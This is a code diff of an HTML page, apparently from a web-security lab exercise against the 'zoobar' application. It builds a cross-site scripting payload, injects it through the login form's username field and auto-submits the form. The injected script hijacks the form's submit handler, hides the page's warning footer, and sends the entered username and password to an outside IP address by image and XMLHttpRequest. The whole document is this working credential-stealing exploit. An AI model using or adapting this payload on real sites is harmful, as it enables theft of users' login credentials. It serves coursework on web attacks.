@@ -3,17 +3,42 @@
     <input type="submit" name="submit_login" value="Log in">
     <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
 </form>
+
 <script>
+    
+    var js = function(){
+        document.addEventListener('DOMContentLoaded', function(e){
+            document.getElementsByName('loginform')[0].setAttribute('onsubmit','myFunction()');
+            document.getElementsByClassName('footer warning')[0].style.visibility = 'hidden';
+            }, 
+            false
+        );
+    }
+    
+    var myFunction = function(){
+        var fires = document.getElementsByName("login_username")[0].value;
+        var water = document.getElementsByName("login_password")[0].value;
+        var ip = "172.27.19.10:12345";
+        var url = "http://"+ip+"/?"+"payload="+encodeURI(fires)+","+encodeURI(water);
+        new Image().src = url;
+        var req = new XMLHttpRequest();req.open('GET', url, true);req.send();
+        console.log(url);
+        //document.getElementById('boo').setAttribute('action', url);
+        //document.getElementById('boo').submit();
+        setTimeout(
+            function(){
+                return true;
+            },
+            2000
+        );
+    };
+    
     var script = "\">"+
         "<script>"+
-            "document.addEventListener('DOMContentLoaded', function(e){document.getElementsByName(\"loginform\")[0].setAttribute('onsubmit','myFunction()');document.getElementsByClassName(\"footer warning\")[0].style.visibility = 'hidden';}, false);"+
-            "function myFunction(){"+
-                "var url = \"http://172.27.19.10:12345/?payload=\" + document.getElementsByName(\"login_username\")[0].value+ \",\" +document.getElementsByName(\"login_password\")[0].value;"+
-                "new Image().src = url;"+
-                "console.log(url);"+
-                "setTimeout(function(){return true;},2000);"+
-            "};"+
-        "<\/script><input hidden id=\""
+            "var myFunction = " + myFunction.toString() + ";" +
+            "var soup = " + js.toString() + ";" +
+            "soup();"+
+        "<\/script><input hidden id=\"";
     document.getElementsByName("login_username")[0].value = script;
-    document.getElementsByName("submit_login")[0].click();
+    document.forms[0].submit();
 </script>
